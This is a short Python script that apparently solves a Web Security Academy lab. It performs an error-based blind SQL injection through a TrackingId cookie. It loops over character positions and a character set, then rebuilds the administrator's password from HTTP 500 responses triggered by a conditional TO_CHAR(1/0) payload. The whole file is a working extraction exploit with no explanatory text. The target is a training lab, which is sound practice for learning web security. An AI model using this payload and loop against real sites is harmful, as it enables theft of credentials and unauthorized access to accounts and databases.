import requests
characters= list('abcdefghijklmnopqrstuvwxyz'+'0123456789'+r'!@#$%^&{}><:"{}[]')

burp0_url = "https://0a75001503399ec0805eb2d0002c008e.web-security-academy.net:443/filter?category=Gifts"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                  "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                  "Referer": "https://0a75001503399ec0805eb2d0002c008e.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
admin_password= []

for number in range(1,21):
    for character in characters:
        burp0_cookies = {"TrackingId": "3FckUU4A3yrQP3cX'||(SELECT CASE WHEN  SUBSTR(password, {}, 1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(number,character), 
                         "session": "joTlcDQK4LrzR4NyTy8YwQN0VMBBOj3u"}
         
        responce=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if (responce.status_code==500):
            print(burp0_cookies)
            print(character)
            admin_password.append(character)
            break
        
admin_password = ''.join(admin_password)
print(admin_password)